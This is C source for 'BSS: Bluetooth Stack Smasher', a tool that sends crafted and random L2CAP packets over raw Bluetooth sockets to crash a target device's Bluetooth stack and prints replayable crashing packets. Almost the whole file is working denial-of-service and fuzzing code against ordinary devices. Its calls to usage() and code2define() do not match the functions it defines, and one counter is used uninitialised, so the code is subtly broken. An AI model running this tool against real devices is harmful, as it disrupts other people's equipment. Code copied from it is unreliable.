/*
 * BSS: Bluetooth Stack Smasher
 * This tool intends to perform several tests on the L2CAP layer 
 * of the bluetooth protocol.
 *
 * Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * You may need to install the libbluetooth (-dev) first. 
 * Debian : apt-get install libbluetooth1-dev
 *
 * Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <asm/byteorder.h>

#define MAXSIZE		4096
#define IT		512
#define LENGTH		20
#define	BUFCODE		100

int usage(char *);
void l2dos(char *, int, int, char);
void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash);
char *code2define(int code);

/**
 * Function to perform L2CAP (Logical Link Control and Adaptation Protocol) DOS attack
 * by sending crafted command packets to a specified Bluetooth device address.
 *
 * @param bdstr_addr  Bluetooth device address as a string
 * @param cmdnum      L2CAP command number to be sent
 * @param siz         Size of the payload to be sent
 * @param pad         Padding byte to be used in payload; if set to 0, defaults to 0x41 ('A')
 *
 * The function establishes a raw L2CAP socket, binds and connects to the specified 
 * Bluetooth device, crafts L2CAP command packets, and sends them repeatedly attempting 
 * to crash the Bluetooth stack of the device.
 */
void l2dos(char *bdstr_addr, int cmd_num, int size, char padding_byte)
{
	char *payload_buffer;
	l2cap_cmd_hdr *command_header;	/* struct detailed in /usr/include/bluetooth/l2cap.h */
	struct sockaddr_l2 address;
	int socket_fd, i, identifier;
	char *command_str = NULL;
	
	if ((socket_fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&address, 0, sizeof(address));
	address.l2_family = AF_BLUETOOTH;
	if (bind(socket_fd, (struct sockaddr *) &address, sizeof(address)) < 0) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(bdstr_addr, &address.l2_bdaddr);
	if (connect(socket_fd, (struct sockaddr *) &address, sizeof(address)) < 0) {
		perror("connect");
		exit(EXIT_FAILURE);
	}

	if(!(payload_buffer = (char *) malloc ((int) size))) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	for(i = L2CAP_CMD_HDR_SIZE; i < size; i++)
	{
		if(padding_byte == 0)
			payload_buffer[i] = 0x41;	/* Default padding byte */
		else
			payload_buffer[i] = padding_byte;
	}
	
	fprintf(stdout, "size = %d\n", size);
	command_str = code2define(cmd_num);
	if(command_str == NULL)
	{
		perror("L2CAP command unknown");
		exit(EXIT_FAILURE);
	}
	else
		fprintf(stdout, "Performing \"%s\" fuzzing...\n", command_str);

	for(i = 0; i < IT; i++){	/* Send IT times the packet thru the air */
		command_header = (l2cap_cmd_hdr *) payload_buffer;
		command_header->code = cmd_num;
		command_header->ident = (i % 250) + 1;	/* Identifier */
		command_header->len = __cpu_to_le16(LENGTH);

		putchar('.');
		fflush(stdout);
		
		if(send(socket_fd, payload_buffer, size ? size : MAXSIZE, 0) <= 0)
		{
			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy %s packets.\n", bdstr_addr, command_str);
			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
			fprintf(stdout, "\t ----------------------------------------------------\n");
			fprintf(stdout, "\t Host\t\t%s\n", bdstr_addr);
			fprintf(stdout, "\t Code field\t%s\n", command_str);
			fprintf(stdout, "\t Ident field\t%d\n", identifier);
			fprintf(stdout, "\t Length field\t%d\n", __cpu_to_le16(LENGTH));
			fprintf(stdout, "\t Packet size\t%d\n", size);
			fprintf(stdout, "\t ----------------------------------------------------\n");
		}
		if(++identifier > 254)
			identifier = 1;
	}

	free(command_str);	
}

/**
 * l2fuzz - Perform fuzz testing on the L2CAP layer of a Bluetooth device.
 * @bt_device_addr: Bluetooth device address to connect to.
 * @max_packet_size: Maximum size of the packet to send.
 * @max_crash_count: Maximum number of crashes to tolerate before stopping.
 *
 * This function connects to a Bluetooth device's L2CAP layer and sends randomly
 * generated packets to it continuously in an attempt to discover vulnerabilities.
 * If it detects that the device has potentially crashed, it logs the incident
 * with the offending packet details. The function will terminate after reaching
 * the specified crash count or can be manually terminated.
 */
void l2fuzz(char *bt_device_addr, int max_packet_size, int max_crash_count)
{
	char *current_packet, *previous_packet;
	struct sockaddr_l2 bluetooth_addr;
	int socket_fd, index, packet_size;
	int crash_counter = 0, previous_packet_size;
	
	if ((socket_fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&bluetooth_addr, 0, sizeof(bluetooth_addr));
	bluetooth_addr.l2_family = AF_BLUETOOTH;
	if (bind(socket_fd, (struct sockaddr *) &bluetooth_addr, sizeof(bluetooth_addr)) < 0) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(bt_device_addr, &bluetooth_addr.l2_bdaddr);
	if (connect(socket_fd, (struct sockaddr *) &bluetooth_addr, sizeof(bluetooth_addr)) < 0) {
		perror("connect");
		exit(EXIT_FAILURE);
	}

	if(!(previous_packet = (char *) malloc ((int) max_packet_size + 1))) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	while(1) // Initite loop (ctrl-c to stop...)
	{
		packet_size = rand() % max_packet_size;
		if(packet_size == 0) 
			packet_size = 1;
		if(!(current_packet = (char *) malloc ((int) packet_size + 1))) {
			perror("malloc");
			exit(EXIT_FAILURE);
		}

		bzero(current_packet, packet_size);
		for(index = 0; index < packet_size ; index++)	
			current_packet[index] = (char) rand();
		
		putchar('.');
		fflush(stdout);
		
		if(send(socket_fd, current_packet, packet_size, 0) <= 0)
		{
			crash_counter++;
			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy packets.\n", bt_device_addr);
			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
			fprintf(stdout, "\t----------------------------------------------------\n");
			fprintf(stdout, "\tHost\t\t%s\n", bt_device_addr);
			fprintf(stdout, "\tPacket size\t%d\n", previous_packet_size);
			fprintf(stdout, "\t----------------------------------------------------\n");
			fprintf(stdout, "\tPacket dump\n\t");
			for(index = 0 ; index < previous_packet_size ; index++)
			{
				fprintf(stdout, "0x%.2X ", (unsigned char) previous_packet[index]);
				if((index % 30) == 29)
					fprintf(stdout, "\n\t");
			}
			fprintf(stdout, "\n\t----------------------------------------------------\n");

			fprintf(stdout, "char replay_buggy_packet[]=\"");
			for(index = 0 ; index < previous_packet_size ; index++)
			{
				fprintf(stdout, "\\x%.2X", (unsigned char) previous_packet[index]);
			}
			fprintf(stdout, "\";\n");

			if((crash_counter == max_crash_count) && (max_crash_count != 0) && (max_crash_count >= 0))
			{
				free(current_packet);
				free(previous_packet);
				exit(EXIT_SUCCESS);
			}
			
		}
		memcpy(previous_packet, current_packet, packet_size); // Get the previous packet, not this one...
		previous_packet_size = packet_size;
		free(current_packet);
	}
}

/**
 * @brief Prints the usage message for the Bluetooth Stack Smasher (BSS) utility.
 *
 * This function displays the usage instructions and information for different modes 
 * supported by the BSS utility. After displaying the usage information, the function 
 * terminates the program with an exit status indicating failure.
 *
 * @param program_name The name of the program (typically argv[0] from main).
 *
 * @return This function does not return; it calls exit to terminate the program.
 */
int print_usage_message(char *program_name)
{
	fprintf(stderr, "BSS: Bluetooth Stack Smasher\n");
	fprintf(stderr, "Usage: %s [-s size] [-m mode] [-p pad_byte] [-M maxcrash_count] <bdaddr>\n", program_name);
	fprintf(stderr, "Modes are :\n	\
			0  ALL MODES LISTED BELOW\n	\
			1  L2CAP_COMMAND_REJ\n	\
			2  L2CAP_CONN_REQ\n	\
			3  L2CAP_CONN_RSP\n	\
			4  L2CAP_CONF_REQ\n	\
			5  L2CAP_CONF_RSP\n	\
			6  L2CAP_DISCONN_REQ\n	\
			7  L2CAP_DISCONN_RSP\n	\
			8  L2CAP_ECHO_REQ\n	\
			9  L2CAP_ECHO_RSP\n	\
			10 L2CAP_INFO_REQ\n	\
			11 L2CAP_INFO_RSP\n	\
			12 L2CAP Random Fuzzing (-s : max_size) (-M crashcount)\n\n");	
	exit(EXIT_FAILURE);
}


/**
 * Converts an L2CAP command code to its corresponding string representation.
 * 
 * Allocates memory to hold the string representation of the L2CAP command and 
 * fills it based on the provided command code. If the provided code matches one 
 * of the known L2CAP commands, the string representation of that command is stored 
 * in the allocated memory and returned. If the code does not match any known 
 * command, NULL is returned.
 *
 * @param code An integer representing the L2CAP command code.
 * 
 * @return A pointer to a string containing the representation of the L2CAP command 
 *         if the code is recognized, otherwise NULL. The caller is responsible for 
 *         freeing the allocated memory.
 */
char *code_to_string(int command_code)
{
    char *command_string = malloc(BUFCODE + 1);
    switch (command_code)
    {
        case L2CAP_ECHO_REQ:
            strcpy(command_string, "L2CAP echo request");    
            break;

        case L2CAP_COMMAND_REJ:
            strcpy(command_string, "L2CAP command reject");    
            break;
            
        case L2CAP_CONN_REQ:
            strcpy(command_string, "L2CAP connection request");    
            break;
            
        case L2CAP_CONN_RSP:
            strcpy(command_string, "L2CAP connection response");    
            break;
            
        case L2CAP_CONF_REQ:
            strcpy(command_string, "L2CAP configuration request");    
            break;
            
        case L2CAP_CONF_RSP:
            strcpy(command_string, "L2CAP configuration response");    
            break;
            
        case L2CAP_DISCONN_REQ:
            strcpy(command_string, "L2CAP disconnection request");    
            break;
            
        case L2CAP_DISCONN_RSP:
            strcpy(command_string, "L2CAP disconnection response");    
            break;
            
        case L2CAP_ECHO_RSP:
            strcpy(command_string, "L2CAP echo response");    
            break;
            
        case L2CAP_INFO_REQ:
            strcpy(command_string, "L2CAP info request");    
            break;
            
        case L2CAP_INFO_RSP:
            strcpy(command_string, "L2CAP info response");    
            break;
            
        default:
            free(command_string);
            command_string = NULL;
    }
    return command_string;
}

/**
 * Main function for executing the Bluetooth Dos attack program.
 *
 * This function performs the following steps:
 * 1. Checks if the user has root privileges.
 * 2. Parses command-line arguments to configure options such as size, mode, padding, and max_crashes.
 * 3. Determines the operating mode for the Bluetooth Dos attack (standard or fuzzing).
 * 4. Executes the attack based on the specified mode.
 *
 * @param argc Number of command-line arguments.
 * @param argv Array of command-line argument strings.
 * @return Returns EXIT_SUCCESS upon successful execution.
 */
int main(int argc, char **argv)
{
	int i, size = 0, mode = 0, max_crashes = 1;
	char bt_address[20], padding = 0;

	if(getuid() != 0)
	{
		fprintf(stderr, "You need to be root to launch %s (raw socket)\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if(argc < 2 || argc > 9)
	{
		usage(argv[0]);
	}
	
	for(i = 0; i < argc; i++){
		if(strchr(argv[i], ':'))
			strncpy(bt_address, argv[i], 18);
		else
		{
			if(!memcmp(argv[i], "-s", 2) && (size = atoi(argv[++i])) < 0)
				usage(argv[0]);
			
			if(!memcmp(argv[i], "-m", 2) && (mode = atoi(argv[++i])) < 0)
				usage(argv[0]);
			
			if(!memcmp(argv[i], "-p", 2) && (padding = (*argv[++i])) < 0)
				usage(argv[0]);
			
			if(!memcmp(argv[i], "-M", 2) && (max_crashes = atoi(argv[++i])) < 0)
				usage(argv[0]);
		}
	}

	if(mode > 12)
	{
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}

	if(mode == 0)
	{
		for(i = 1; i <= 0x0b; i++)
			l2dos(bt_address, i, size ? size : MAXSIZE, padding);
		l2fuzz(bt_address, size ? size : MAXSIZE, max_crashes);
	}
	else
	{
		if(mode <= 11)
			l2dos(bt_address, mode, size ? size : MAXSIZE, padding);
		if(mode == 12)
			l2fuzz(bt_address, size ? size : MAXSIZE, max_crashes);
	}
	fprintf(stdout, "\nYour bluetooth device didn't crash receiving the packets\n");
	
	return EXIT_SUCCESS;
}
